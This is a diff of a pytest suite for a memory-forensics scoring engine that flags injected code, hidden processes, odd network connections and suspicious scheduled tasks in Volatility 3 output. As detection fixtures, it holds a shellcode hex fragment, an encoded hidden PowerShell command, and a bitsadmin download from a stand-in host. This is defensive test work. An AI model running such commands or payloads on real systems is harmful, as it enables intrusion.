@@ -1,4 +1,9 @@
-"""The step scorers, against rows shaped like Volatility 3 actually emits them.
+"""The forensic facts the scorers must keep getting right.
+
+These assertions used to run against ``OverviewAnalysis._score_*``. That code is
+gone -- the unified engine in ``volmemlyzer.scoring`` is the only scorer now --
+so each one is re-pointed at ``score_records``, which is what actually decides
+these verdicts today. The facts are unchanged; only the caller moved.
 
 These rules surface signal for an analyst. They are not detections, and none of
 these tests assert that something is or is not malicious -- only that the noisy
@@ -9,6 +14,8 @@ from __future__ import annotations
 import pytest
 
 from volmemlyzer.analysis import OverviewAnalysis
+from volmemlyzer.scoring import score_records
+from volmemlyzer.scoring import heuristics as H
 from volmemlyzer.utilities import is_suspicious_path
 
 
@@ -22,204 +29,263 @@ def eng():
     return OverviewAnalysis()
 
 
+# --- helpers that ask the engine the question a scorer used to be asked ------
+
+def _score(records: dict, profile: dict | None = None) -> dict:
+    return score_records(records, profile or {"preset": "balanced"})
+
+
+def _objects(out: dict, object_type: str) -> list[dict]:
+    return [o for o in out["scored_objects"] if o["object_type"] == object_type]
+
+
+def _flags(out: dict, pid: int) -> set[str]:
+    """Every rule that fired on a PID, superseded or not."""
+    return set((out["process_risk"].get(pid) or {}).get("flags") or [])
+
+
+def _score_of(out: dict, pid: int) -> float:
+    return float((out["process_risk"].get(pid) or {}).get("score") or 0)
+
+
+def _region(data: bytes, pid: int = 1000, **over) -> dict:
+    row = {"PID": pid, "Process": "t.exe", "Protection": "PAGE_EXECUTE_READWRITE",
+           "PrivateMemory": 1, "CommitCharge": 1, "Start VPN": 0x1000,
+           "Hexdump": hexdump(data)}
+    row.update(over)
+    return row
+
+
+def _malfind(*rows: dict, pid: int = 1000) -> dict:
+    """malfind rows plus the census entry their PID needs.
+
+    The engine attributes a region to the process that owns it, and a process it
+    has never seen in pslist or psscan is not in the inventory at all -- so
+    without this the flags come back empty for the wrong reason.
+    """
+    return {"pslist": [_proc(pid, "t.exe", 700)], "malfind": list(rows)}
+
+
+def _proc(pid: int, name: str, ppid: int | None, path: str = "") -> dict:
+    return {"PID": pid, "PPID": ppid, "ImageFileName": name, "Wow64": False,
+            **({"Path": path} if path else {})}
+
+
+def _cmd(pid: int, path: str) -> dict:
+    return {"PID": pid, "Args": path}
+
+
+SYS = "C:\\Windows\\System32"
+
+
 # --------------------------------------------------------------------------
-# malfind
+# malfind: what separates an injected region from a JIT allocation
 # --------------------------------------------------------------------------
 
-def test_an_unreadable_region_does_not_take_the_step_down(eng):
+def test_an_unreadable_region_does_not_take_the_step_down():
     """Volatility writes the literal "N/A" when it could not read the region."""
-    assert eng._score_injections({"Hexdump": "N/A", "Protection": "PAGE_NOACCESS"}) == (
-        0, "", "—")
+    out = _score(_malfind(_region(b"", Hexdump="N/A", Protection="PAGE_NOACCESS")))
+    assert _flags(out, 1000) == set()
 
 
-@pytest.mark.parametrize("value", [None, float("nan"), 123, ""])
-def test_a_missing_hexdump_is_not_an_error(eng, value):
-    assert eng._hexdump_bytes(value) == b""
+@pytest.mark.parametrize("value", ["", "N/A", "not hex at all"])
+def test_a_missing_hexdump_is_not_an_error(value):
+    assert H.hexdump_to_bytes(value) == b""
 
 
-def test_a_real_hexdump_round_trips(eng):
-    assert eng._hexdump_bytes(hexdump(b"MZ\x90\x00")) == b"MZ\x90\x00"
+def test_a_real_hexdump_round_trips():
+    assert H.hexdump_to_bytes(hexdump(b"MZ\x90\x00")) == b"MZ\x90\x00"
 
 
-def test_an_empty_region_is_not_a_finding(eng):
+def test_an_empty_region_is_not_a_finding():
     """Volatility reports plenty of these; they were scored as if they held code."""
-    score, _, why = eng._score_injections({
-        "Hexdump": hexdump(b"\x00" * 64),
-        "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1})
-    assert score == 0 and "zero" in why
+    out = _score(_malfind(_region(b"\x00" * 64)))
+    assert "malfind_pe_header" not in _flags(out, 1000)
+    assert "malfind_shellcode" not in _flags(out, 1000)
 
 
-def test_a_bare_private_executable_region_stays_below_the_threshold(eng):
-    """Nearly every malfind row looks like this; JIT engines produce them freely."""
-    score, _, _ = eng._score_injections({
-        "Hexdump": hexdump(b"\x48\x89\x5c\x24\x08" + b"\x33" * 59),
-        "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1})
-    assert score < eng._threshold("malfind")
-
-
-@pytest.mark.parametrize("data,flag", [
-    (b"MZ\x90\x00" + b"\x41" * 60, "PE"),
-    (b"\x90" * 16 + b"\xcc" * 48, "SLED"),
-    (b"\xfc\xe8\x8f\x00\x00\x00" + b"\x60" * 58, "STUB"),
+@pytest.mark.parametrize("data,rule", [
+    (b"MZ\x90\x00" + b"\x41" * 60, "malfind_pe_header"),
+    (b"\x90" * 16 + b"\xcc" * 48, "malfind_shellcode"),
+    (b"\xfc\xe8\x8f\x00\x00\x00" + b"\x60" * 58, "malfind_shellcode"),
 ])
-def test_distinctive_region_contents_surface(eng, data, flag):
-    score, flags, _ = eng._score_injections({
-        "Hexdump": hexdump(data),
-        "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1})
-    assert flag in flags
-    assert score >= eng._threshold("malfind")
+def test_distinctive_region_contents_surface(data, rule):
+    out = _score(_malfind(_region(data)))
+    assert rule in _flags(out, 1000)
+    assert _objects(out, "process"), "a region with a payload signature must surface"
 
 
-def test_scoring_does_not_depend_on_capstone(eng):
+def test_scoring_does_not_depend_on_capstone():
     """Capstone is an optional extra, so the Disasm column may be assembly text or
     a byte dump depending on the install. Scoring must not change either way."""
-    region = {"Hexdump": hexdump(b"MZ\x90\x00" + b"\x41" * 60),
-              "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1}
-    with_asm = dict(region, Disasm="\n0x0:\tpush\tebp\n0x1:\tmov\tebp, esp")
-    without = dict(region, Disasm="4d 5a 90 00")
-    assert eng._score_injections(with_asm) == eng._score_injections(without)
+    data = b"MZ\x90\x00" + b"\x41" * 60
+    with_asm = _score(_malfind(_region(
+        data, Disasm="\n0x0:\tpush\tebp\n0x1:\tmov\tebp, esp")))
+    without = _score(_malfind(_region(data, Disasm="4d 5a 90 00")))
+    assert _flags(with_asm, 1000) == _flags(without, 1000)
+    assert _score_of(with_asm, 1000) == _score_of(without, 1000)
+
+
+@pytest.mark.parametrize("data,label", [
+    # PID 5292, SearchHost.exe: mov rax,imm64 / jmp rax trampolines, cc padding.
+    (bytes.fromhex("48b800000010 9a01000048ffe0cccccc48b800100010 9a01000048ffe0cccccc"
+                   .replace(" ", "")), "mov rax,imm64 / jmp rax trampolines"),
+    # PID 5292: an ordinary x64 prologue spilling its arguments.
+    (bytes.fromhex("48895424104889 4c24084c89442418 4c894c2420488b4128488b4808488b5150"
+                   .replace(" ", "")), "an ordinary x64 prologue"),
+    # PID 3768, powershell.exe: a table of heap pointers, not code at all.
+    (bytes.fromhex("000000000000000010773a286902000010773a2869020000"
+                   "00003a2869020000b00dd02969020000"), "a table of heap pointers"),
+])
+def test_ordinary_private_executable_regions_do_not_surface(data, label):
+    """A JIT engine produces these by the dozen in every browser and .NET host."""
+    fired = _flags(_score(_malfind(_region(data))), 1000)
+    assert not (fired - {"malfind_rwx_private"}), f"{label} fired {fired}"
+
+
+def test_the_protection_flags_alone_never_reach_a_payload_verdict():
+    """Otherwise every malfind row surfaces, since malfind only reports these."""
+    fired = _flags(_score(_malfind(_region(b"\x33\xc0" + b"\x90" * 4 + b"\x11" * 58))), 1000)
+    assert fired == {"malfind_rwx_private"}
+
+
+def test_a_peb_walk_needs_more_than_a_pair_of_field_accesses():
+    """Compiled code reaches structure fields the same way; two is meaningless.
+
+    The original threshold was two, and the merged engine raised it to three
+    after two -- one of which is the two-byte ``8b 36`` -- fired on ordinary
+    compiled functions. The fact under test is unchanged: one field read is not
+    a walk.
+    """
+    assert H.walks_peb_loader_lists(bytes.fromhex("8b400c") + b"\x00" * 32) is False
+    assert H.walks_peb_loader_lists(bytes.fromhex("8b400c8b701c")) is False
+    assert H.walks_peb_loader_lists(bytes.fromhex("8b400c8b701c8b4608")) is True
+
+
+def test_small_pushed_constants_are_not_read_as_hashes():
+    """push 0x10, push 0x100 -- lengths and flags, mostly zero bytes."""
+    assert H.api_hash_pushes(bytes.fromhex("6810000000") * 3) == 0
+    assert H.api_hash_pushes(bytes.fromhex("68b2f2e2f4")) == 1
+
+
+def test_the_shellcode_region_surfaces():
+    """PID 2580, malware.exe: the PEB->Ldr walk followed by a pushed API hash."""
+    shellcode = bytes.fromhex(
+        "558bec81c4e8feffff6083ec04832424001e0fa01f33c040d1e040c1e0048b001f"
+        "8b400c8b701c33c98b46088b7e208b3666394f1875f268b2f2e2f46832749100")
+    out = _score(_malfind(_region(shellcode, CommitCharge=2)))
+    assert "malfind_peb_walk" in _flags(out, 1000)
+    assert _objects(out, "process"), "the shellcode region must reach the table"
 
 
 # --------------------------------------------------------------------------
 # process census
 # --------------------------------------------------------------------------
 
-def _census(*procs):
-    out = {}
-    for pid, name, ppid, path in procs:
-        out[pid] = {"pid": pid, "name": name, "ppid": ppid, "path": path, "wow64": None}
-    return out
+def _boot(*extra: dict) -> dict:
+    procs = [
+        _proc(4, "System", None), _proc(400, "smss.exe", 4),
+        _proc(500, "csrss.exe", 400), _proc(600, "wininit.exe", 400),
+        _proc(700, "services.exe", 600), _proc(800, "lsass.exe", 600),
+        _proc(900, "svchost.exe", 700), _proc(1000, "RuntimeBroker.exe", 900),
+        _proc(1100, "ApplicationFrameHost.exe", 900),
+    ]
+    cmds = [_cmd(p["PID"], f"{SYS}\\{p['ImageFileName']}") for p in procs if p["PID"] != 4]
+    return {"pslist": procs + list(extra), "cmdline": cmds}
 
 
-SYS = "C:\\Windows\\System32"
+def test_a_normal_windows_boot_produces_no_findings():
+    """The false-positive guard. If this fails, fix the rule, not the test."""
+    out = _score(_boot())
+    assert _objects(out, "process") == [], (
+        f"the operating system booting normally was flagged: "
+        f"{[o['label'] for o in _objects(out, 'process')]}")
 
 
-def test_a_normal_windows_boot_produces_no_findings(eng):
-    census = _census(
-        (4, "System", None, ""),
-        (400, "smss.exe", 4, f"{SYS}\\smss.exe"),
-        (500, "csrss.exe", 400, f"{SYS}\\csrss.exe"),
-        (600, "wininit.exe", 400, f"{SYS}\\wininit.exe"),
-        (700, "services.exe", 600, f"{SYS}\\services.exe"),
-        (800, "lsass.exe", 600, f"{SYS}\\lsass.exe"),
-        (900, "svchost.exe", 700, f"{SYS}\\svchost.exe"),
-        (1000, "RuntimeBroker.exe", 900, f"{SYS}\\RuntimeBroker.exe"),
-        (1100, "ApplicationFrameHost.exe", 900, f"{SYS}\\ApplicationFrameHost.exe"),
-    )
-    summary, rows = eng._score_processes(census, psscan=[], psxview=None)
-    assert rows == [], f"the operating system booting normally was flagged: {rows}"
-    assert summary["psxview_inconsistent"] is None
-
-
-def test_services_exe_under_wininit_is_not_a_finding(eng):
+def test_services_exe_under_wininit_is_not_a_finding():
     """It used to score 8 with a rationale claiming a suspicious path."""
-    census = _census((600, "wininit.exe", 400, f"{SYS}\\wininit.exe"),
-                     (700, "services.exe", 600, f"{SYS}\\services.exe"))
-    _, rows = eng._score_processes(census, psscan=[], psxview=None)
-    assert rows == []
-
-
-def test_an_orphan_is_scored_once(eng):
-    """Two rules used to test the same condition, so orphans carried 12-14 points
-    and a duplicated ZB flag."""
-    census = _census((1234, "thing.exe", 9999, f"{SYS}\\thing.exe"))
-    _, rows = eng._score_processes(census, psscan=[], psxview=None)
-    # Below the surfacing threshold on its own, and flagged exactly once.
-    scored = eng._score_processes(census, [], None)
-    assert scored[1] == [] or scored[1][0][4].count("ZB") == 1
+    out = _score(_boot())
+    assert _flags(out, 700) == set()
 
 
 def test_pid_zero_is_the_kernel_root_not_an_orphan(eng):
-    census = _census((4, "System", 0, ""))
-    summary, rows = eng._score_processes(census, psscan=[], psxview=None)
-    assert summary["orphans"] == 0
-    assert rows == []
+    census = eng._build_census([_proc(4, "System", 0)], [])
+    eng._scored = {"process_risk": {}}
+    assert eng._census_summary(census, psscan=None, psxview=None)["orphans"] == 0
 
 
-def test_each_pid_appears_at_most_once(eng):
-    census = _census((1, "a.exe", None, "C:\\Users\\u\\Downloads\\a.exe"),
-                     (2, "b.exe", 1, "C:\\Users\\u\\Desktop\\b.exe"))
-    _, rows = eng._score_processes(census, psscan=[], psxview=None)
-    pids = [r[0] for r in rows]
-    assert len(pids) == len(set(pids))
+def test_a_live_process_only_pool_scan_can_see_surfaces():
+    """psscan sees it, pslist does not, and it carries no exit time."""
+    recs = _boot()
+    recs["psscan"] = [{"PID": 6666, "PPID": 700, "ImageFileName": "x.exe", "ExitTime": None}]
+    assert "hidden_process" in _flags(_score(recs), 6666)
 
 
-def test_a_live_process_only_pool_scan_can_see_surfaces(eng):
-    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
-    _, rows = eng._score_processes(census, psscan=[{"PID": 6666, "ExitTime": None}], psxview=None)
-    assert any(r[0] == 6666 and "HK" in r[4] for r in rows)
-
-
-def test_a_terminated_process_is_ordinary_churn(eng):
+def test_a_terminated_process_is_ordinary_churn():
     """Every image has dozens of these; they must not read like hidden processes."""
-    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
-    summary, rows = eng._score_processes(
-        census, psscan=[{"PID": 6666, "ExitTime": "2024-01-01T00:00:00"}], psxview=None)
-    assert not any(r[0] == 6666 for r in rows)
-    assert summary["hidden_count"] == 0
-    assert summary["terminated_count"] == 1
+    recs = _boot()
+    recs["psscan"] = [{"PID": 6666, "PPID": 700, "ImageFileName": "x.exe",
+                       "ExitTime": "2024-01-01T00:00:00"}]
+    assert "hidden_process" not in _flags(_score(recs), 6666)
 
 
-def test_a_system_name_outside_a_system_path_surfaces(eng):
-    census = _census((1234, "svchost.exe", 900, "C:\\Users\\alice\\AppData\\Local\\Temp\\svchost.exe"))
-    _, rows = eng._score_processes(census, psscan=[], psxview=None)
-    assert rows and "IMP" in rows[0][4]
+def test_a_system_name_outside_a_system_path_surfaces():
+    recs = _boot(_proc(1234, "svchost.exe", 900))
+    recs["cmdline"].append(_cmd(1234, "C:\\Users\\alice\\AppData\\Local\\Temp\\svchost.exe"))
+    assert "core_proc_wrong_path" in _flags(_score(recs), 1234)
 
 
-def test_a_near_miss_system_name_surfaces(eng):
-    census = _census((1234, "svch0st.exe", 900, f"{SYS}\\svch0st.exe"))
-    _, rows = eng._score_processes(census, psscan=[], psxview=None)
-    assert rows and "LOOK" in rows[0][4]
+def test_a_near_miss_system_name_surfaces():
+    recs = _boot(_proc(1234, "svch0st.exe", 900))
+    recs["cmdline"].append(_cmd(1234, f"{SYS}\\svch0st.exe"))
+    assert "core_proc_masquerade_name" in _flags(_score(recs), 1234)
 
 
-def test_script_interpreter_launching_external_native_child_surfaces(eng):
-    census = _census(
-        (5048, "powershell.exe", 1000, f"{SYS}\\WindowsPowerShell\\v1.0\\powershell.exe"),
-        (7936, "malware.exe", 5048, "Z:\\malware.exe"),
-    )
-    _, rows = eng._score_processes(census, psscan=[], psxview=None)
-    child = next(row for row in rows if row[0] == 7936)
-    assert "SCRIPT_CHILD_EXTERNAL" in child[4]
-    assert child[3] in {"Medium", "High", "Critical"}
+def test_a_singleton_running_twice_surfaces():
+    recs = _boot(_proc(1234, "lsass.exe", 600))
+    recs["cmdline"].append(_cmd(1234, f"{SYS}\\lsass.exe"))
+    assert "core_proc_illegal_instances" in _flags(_score(recs), 1234)
 
 
-def test_script_interpreter_with_standard_install_child_is_not_the_external_rule(eng):
-    census = _census(
-        (5048, "powershell.exe", 1000, f"{SYS}\\WindowsPowerShell\\v1.0\\powershell.exe"),
-        (6000, "python.exe", 5048, "C:\\Program Files\\Python\\python.exe"),
-    )
-    _, rows = eng._score_processes(census, psscan=[], psxview=None)
-    assert not any("SCRIPT_CHILD_EXTERNAL" in row[4] for row in rows)
-
-
-def test_one_psxview_disagreement_is_not_enough(eng):
+def test_one_psxview_disagreement_is_not_enough():
     """A process that has exited is legitimately absent from one source."""
-    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
-    psx = [{"PID": 900, "pslist": True, "psscan": True, "thrdscan": False, "csrss": True}]
-    summary, rows = eng._score_processes(census, psscan=[], psxview=psx)
-    assert summary["psxview_inconsistent"] == 0
-    assert not any("XV" in r[4] for r in rows)
+    recs = _boot()
+    recs["psxview"] = [{"PID": 900, "pslist": True, "psscan": True,
+                        "thrdscan": False, "csrss": True}]
+    assert "psxview_inconsistent" not in _flags(_score(recs), 900)
 
 
-def test_two_psxview_disagreements_surface(eng):
-    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
-    psx = [{"PID": 900, "pslist": False, "psscan": True, "thrdscan": False, "csrss": True}]
-    summary, rows = eng._score_processes(census, psscan=[], psxview=psx)
-    assert summary["psxview_inconsistent"] == 1
-    assert any("XV" in r[4] for r in rows)
+def test_two_psxview_disagreements_surface():
+    recs = _boot()
+    recs["psxview"] = [{"PID": 900, "pslist": False, "psscan": True,
+                        "thrdscan": False, "csrss": True}]
+    assert "psxview_inconsistent" in _flags(_score(recs), 900)
 
 
-def test_wow64_false_is_not_read_as_a_discovery_disagreement(eng):
+def test_wow64_false_is_not_read_as_a_discovery_disagreement():
     """The old rule swept every boolean column, Wow64 included."""
-    census = _census((900, "svchost.exe", 700, f"{SYS}\\svchost.exe"))
-    psx = [{"PID": 900, "pslist": True, "psscan": True, "thrdscan": True,
-            "csrss": True, "Wow64": False, "ExitTime": False}]
-    summary, _ = eng._score_processes(census, psscan=[], psxview=psx)
-    assert summary["psxview_inconsistent"] == 0
+    recs = _boot()
+    recs["psxview"] = [{"PID": 900, "pslist": True, "psscan": True, "thrdscan": True,
+                        "csrss": True, "Wow64": False}]
+    assert "psxview_inconsistent" not in _flags(_score(recs), 900)
+
+
+def test_a_discovery_disagreement_cannot_surface_a_process_on_its_own():
+    """thrdscan and csrss legitimately miss many live processes.
+
+    Against the reference image this rule alone accounted for 18 of 25 surfaced
+    rows, so it corroborates but never surfaces by itself.
+    """
+    recs = {"pslist": [_proc(900, "svchost.exe", 700)],
+            "psxview": [{"PID": 900, "pslist": False, "psscan": False,
+                         "thrdscan": False, "csrss": True}]}
+    out = _score(recs)
+    assert "psxview_inconsistent" in _flags(out, 900)
+    assert _objects(out, "process") == []
 
 
 # --------------------------------------------------------------------------
-# census construction
+# census construction (orchestration, not scoring -- still OverviewAnalysis')
 # --------------------------------------------------------------------------
 
 def test_the_census_reaches_processes_nested_in_the_tree(eng):
@@ -279,7 +345,10 @@ def test_an_empty_path_is_not_suspicious():
 
 
 # --------------------------------------------------------------------------
-# the ladder itself
+# the ladder itself -- the --min-risk / --high-level CLI contract
+#
+# The ladder now has one definition, the tuning profile. These pin that the CLI
+# flag still means what it meant when OverviewAnalysis owned its own copy.
 # --------------------------------------------------------------------------
 
 @pytest.mark.parametrize("score,band", [
@@ -287,64 +356,87 @@ def test_an_empty_path_is_not_suspicious():
     (14, "High"), (19, "High"), (20, "Critical"), (99, "Critical"),
 ])
 def test_the_ladder_maps_scores_to_bands(eng, score, band):
-    assert eng._risk_from_score(score) == band
+    assert eng._tuning.band(score) == band
 
 
-def test_every_surface_threshold_sits_on_a_band_boundary(eng):
-    """Otherwise a shown row could still be labelled below the band it cleared."""
-    floors = {f for _, f in OverviewAnalysis.RISK_BANDS}
-    for surface, value in OverviewAnalysis.SURFACE_THRESHOLDS.items():
-        assert value in floors, f"{surface} threshold {value} is not a band floor"
+OBJECT_TYPES = ("process", "connection", "persistence", "kernel")
 
 
-def test_min_risk_raises_every_threshold(eng):
-    low = OverviewAnalysis("low")
+def test_min_risk_raises_every_threshold():
+    low, high = OverviewAnalysis("low"), OverviewAnalysis("high")
+    for object_type in OBJECT_TYPES:
+        assert high._threshold(object_type) >= low._threshold(object_type)
+        assert high._threshold(object_type) >= high._tuning.risk_bands["high"]
+
+
+def test_min_risk_admits_exactly_the_bands_at_or_above_it():
+    """The floor --min-risk names is the band floor, so nothing below it shows."""
     high = OverviewAnalysis("high")
-    for surface in OverviewAnalysis.SURFACE_THRESHOLDS:
-        assert high._threshold(surface) >= low._threshold(surface)
-        assert high._threshold(surface) >= OverviewAnalysis.MIN_RISK["high"]
+    assert high._min_risk_floor() == high._tuning.risk_bands["high"]
+    for object_type in OBJECT_TYPES:
+        floor = high._threshold(object_type)
+        assert high._tuning.band(floor) == "High"
+        assert high._tuning.band(floor - 1) != "High"
 
 
-def test_min_risk_filters_already_labelled_rows():
-    eng = OverviewAnalysis("high")
-    rows = [["a", "Low"], ["b", "Medium"], ["c", "High"], ["d", "Critical"]]
-    assert [r[0] for r in eng._keep(rows, 1)] == ["c", "d"]
+def test_low_is_the_profile_threshold_and_never_raises_it():
+    low = OverviewAnalysis("low")
+    assert low._min_risk_floor() == 0
+    for object_type in OBJECT_TYPES:
+        assert low._threshold(object_type) == low._tuning.surface_threshold(object_type)
 
 
 def test_high_level_is_the_same_knob_as_min_risk_high():
     eng = OverviewAnalysis()
-    eng._min_risk = "high" if True else eng._min_risk
-    assert eng._threshold("netscan") == OverviewAnalysis("high")._threshold("netscan")
+    eng._min_risk = "high"
+    for object_type in OBJECT_TYPES:
+        assert eng._threshold(object_type) == OverviewAnalysis("high")._threshold(object_type)
+
+
+def test_the_ladder_has_one_definition():
+    """OverviewAnalysis reports the engine's ceiling rather than its own copy."""
+    from volmemlyzer.scoring import MAX_RISK_SCORE
+    assert OverviewAnalysis.MAX_RISK_SCORE == MAX_RISK_SCORE
 
 
 # --------------------------------------------------------------------------
 # network attribution and independent corroboration
 # --------------------------------------------------------------------------
 
-def _connection(**over):
-    row = {
-        "State": "ESTABLISHED", "Proto": "TCPv4",
-        "LocalAddr": "10.0.0.5", "LocalPort": 50000,
-        "ForeignAddr": "8.8.8.8", "ForeignPort": 443,
-        "Owner": "", "PID": None,
-        "_pid_conn_count": 1, "_same_remote_count": 1,
-    }
+def _connection(**over) -> dict:
+    row = {"State": "ESTABLISHED", "Proto": "TCPv4",
+           "LocalAddr": "10.0.0.5", "LocalPort": 50000,
+           "ForeignAddr": "8.8.8.8", "ForeignPort": 443, "Owner": "", "PID": None}
     row.update(over)
     return row
 
 
-def test_public_connection_without_pid_is_context_not_a_finding(eng):
-    score, flags, _ = eng._score_network_connections(
-        _connection(), eng._is_private_ip, eng._is_loopback)
-    assert flags == ["PublicNoPID"]
-    assert score < eng._threshold("netscan")
+def _conn_flags(out: dict) -> set[str]:
+    return {c["rule_id"] for o in _objects(out, "connection") for c in o["contributions"]}
 
 
-def test_unattributed_public_admin_connection_has_independent_corroboration(eng):
-    score, flags, _ = eng._score_network_connections(
-        _connection(ForeignPort=445), eng._is_private_ip, eng._is_loopback)
-    assert {"PublicNoPID", "AdminPortOutbound", "EstablishedPublic"} <= set(flags)
-    assert score >= eng._threshold("netscan")
+def test_public_connection_without_pid_is_context_not_a_finding():
+    """Missing attribution is an evidence-quality warning, not a threat behaviour.
+
+    It surfaces as Low on its own -- the engine lets a lone severity-4 signal
+    reach the table -- but it must not be joined by a behavioural rule it did
+    not earn.
+    """
+    out = _score({"netscan": [_connection()]})
+    assert _conn_flags(out) == {"net_public_no_pid"}
+
+
+def test_unattributed_public_admin_connection_has_independent_corroboration():
+    out = _score({"netscan": [_connection(ForeignPort=445)]})
+    assert {"net_public_no_pid", "net_admin_port_outbound"} <= _conn_flags(out)
+
+
+def test_a_private_destination_is_not_a_public_connection():
+    assert _conn_flags(_score({"netscan": [_connection(ForeignAddr="10.0.0.9")]})) == set()
+
+
+def test_a_known_implant_port_surfaces():
+    assert "net_bad_port" in _conn_flags(_score({"netscan": [_connection(ForeignPort=4444)]}))
 
 
 # --------------------------------------------------------------------------
@@ -356,9 +448,13 @@ def test_unattributed_public_admin_connection_has_independent_corroboration(eng)
 # so read as a non-system path.
 # --------------------------------------------------------------------------
 
-def _task(name, action, args="", trigger="", principal="", enabled=True):
+def _task(name, action, args="", trigger="", principal="", enabled=True) -> dict:
     return {"Task Name": name, "Action": action, "Action Arguments": args,
             "Trigger Type": trigger, "Principal ID": principal, "Enabled": enabled}
+
+
+def _persist_flags(out: dict) -> set[str]:
+    return {c["rule_id"] for o in _objects(out, "persistence") for c in o["contributions"]}
 
 
 STOCK_TASKS = [
@@ -382,19 +478,18 @@ STOCK_TASKS = [
 
 
 @pytest.mark.parametrize("row", STOCK_TASKS, ids=lambda r: r["Task Name"])
-def test_windows_own_maintenance_tasks_do_not_surface(eng, row):
-    score, _ = eng._score_scheduled_task(row)
-    assert score < eng._threshold("scheduled_tasks"), (
-        f"{row['Task Name']} scored {score} and would be tabled")
+def test_windows_own_maintenance_tasks_do_not_surface(row):
+    out = _score({"scheduled_tasks": [row]})
+    assert _objects(out, "persistence") == [], (
+        f"{row['Task Name']} would be tabled")
 
 
-def test_a_per_user_vendor_updater_does_not_surface(eng):
+def test_a_per_user_vendor_updater_does_not_surface():
     """OneDrive genuinely installs under LocalAppData and updates on a schedule."""
     row = _task("OneDrive Reporting Task-S-1-5-21-2515051972",
                 "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
                 "", "Time")
-    score, _ = eng._score_scheduled_task(row)
-    assert score < eng._threshold("scheduled_tasks")
+    assert _objects(_score({"scheduled_tasks": [row]}), "persistence") == []
 
 
 @pytest.mark.parametrize("name,script", [
@@ -402,100 +497,108 @@ def test_a_per_user_vendor_updater_does_not_surface(eng):
     ("PID", "C:\\Workspace\\log_pid.ps1"),
     ("UTG", "C:\\Workspace\\UTG\\launch.ps1"),
 ])
-def test_a_powershell_script_run_at_logon_surfaces(eng, name, script):
-    score, why = eng._score_scheduled_task(_task(name, "PowerShell", script, "Logon", "Author"))
-    assert score >= eng._threshold("scheduled_tasks")
-    assert eng._risk_from_score(score) in {"High", "Critical"}
-    assert any("Script" in w for w in why)
+def test_a_powershell_script_run_at_logon_surfaces(name, script):
+    out = _score({"scheduled_tasks": [_task(name, "PowerShell", script, "Logon", "Author")]})
+    assert "scheduled_task_suspicious" in _persist_flags(out)
+    why = " ".join(c["evidence"] for o in _objects(out, "persistence")
+                   for c in o["contributions"])
+    assert "Script payload" in why
 
 
-def test_an_encoded_powershell_task_surfaces(eng):
-    score, _ = eng._score_scheduled_task(
-        _task("Updater", "powershell.exe", "-nop -w hidden -enc SQBFAFgA", "Logon"))
-    assert score >= eng._threshold("scheduled_tasks")
+def test_an_encoded_powershell_task_surfaces():
+    out = _score({"scheduled_tasks": [
+        _task("Updater", "powershell.exe", "-nop -w hidden -enc SQBFAFgA", "Logon")]})
+    assert "scheduled_task_suspicious" in _persist_flags(out)
 
 
-def test_task_argument_rationales_do_not_call_every_switch_obfuscation(eng):
-    _, why = eng._score_scheduled_task(
-        _task("Updater", "powershell.exe", "-noprofile -windowstyle hidden"))
-    assert "Hidden-window argument" in why
-    assert "PowerShell profile loading disabled" not in why  # strongest payload signal wins
-    assert not any("Obfuscat" in reason for reason in why)
+def test_a_bits_transfer_task_surfaces():
+    out = _score({"scheduled_tasks": [
+        _task("Updater", "cmd.exe", "bitsadmin /transfer job https://example.test/a x")]})
+    assert "scheduled_task_suspicious" in _persist_flags(out)
 
 
-def test_bits_transfer_is_named_as_transfer_not_obfuscation(eng):
-    score, why = eng._score_scheduled_task(
-        _task("Updater", "cmd.exe", "bitsadmin /transfer job https://example.test/a x"))
-    assert score >= eng._threshold("scheduled_tasks")
-    assert "BITS transfer command in arguments" in why
-    assert not any("Obfuscat" in reason for reason in why)
-
-
-def test_bits_action_with_transfer_arguments_surfaces(eng):
-    score, why = eng._score_scheduled_task(
-        _task("Updater", "C:\\Windows\\System32\\bitsadmin.exe",
-              "/transfer job https://example.test/a C:\\Temp\\a"))
-    assert score >= eng._threshold("scheduled_tasks")
-    assert "BITS transfer command in arguments" in why
-
-
-def test_bare_bitsadmin_action_is_not_called_a_transfer(eng):
-    _, why = eng._score_scheduled_task(
-        _task("Updater", "C:\\Windows\\System32\\bitsadmin.exe", "/list"))
-    assert "BITS transfer command in arguments" not in why
+def test_a_task_is_identified_by_its_name():
+    """One task is one object however many rules describe it."""
+    out = _score({"scheduled_tasks": [
+        _task("LOG", "PowerShell", "C:\\Workspace\\export_logs.ps1", "Logon")]})
+    assert [o["key"] for o in _objects(out, "persistence")] == ["task:log"]
 
 
 # --------------------------------------------------------------------------
 # UserAssist: execution location is corroboration, not a verdict
 # --------------------------------------------------------------------------
 
+def _ua(name: str) -> dict:
+    return {"userassist": [{"Name": name, "Type": "Value", "Count": 1}]}
+
+
 @pytest.mark.parametrize("path", [
-    r"D:\\virtio-win-guest-tools.exe",
-    r"C:\\Users\\alice\\Downloads\\setup.exe",
-    r"C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe",
+    "D:\\virtio-win-guest-tools.exe",
+    "C:\\Users\\alice\\Downloads\\setup.exe",
+    "C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe",
 ])
-def test_userassist_location_alone_stays_below_surface_threshold(eng, path):
-    score, _ = eng._score_userassist_name(path)
-    assert score < eng._threshold("userassist")
+def test_userassist_location_alone_stays_below_the_surface_threshold(path):
+    """Ordinary software is downloaded, unpacked and run from these directories."""
+    out = _score(_ua(path))
+    objs = _objects(out, "persistence")
+    assert all(o["risk"] == "Low" for o in objs)
+    assert all(o["score"] < out["profile"]["risk_bands"]["medium"] for o in objs)
 
 
-def test_userassist_exact_known_tool_plus_location_surfaces(eng):
-    score, why = eng._score_userassist_name(r"D:\\Packed\\pafish64.exe")
-    assert score >= eng._threshold("userassist")
-    assert any("known dual-use" in reason for reason in why)
+def _ua_why(name: str) -> str:
+    return " ".join(c["evidence"] for o in _objects(_score(_ua(name)), "persistence")
+                    for c in o["contributions"])
 
 
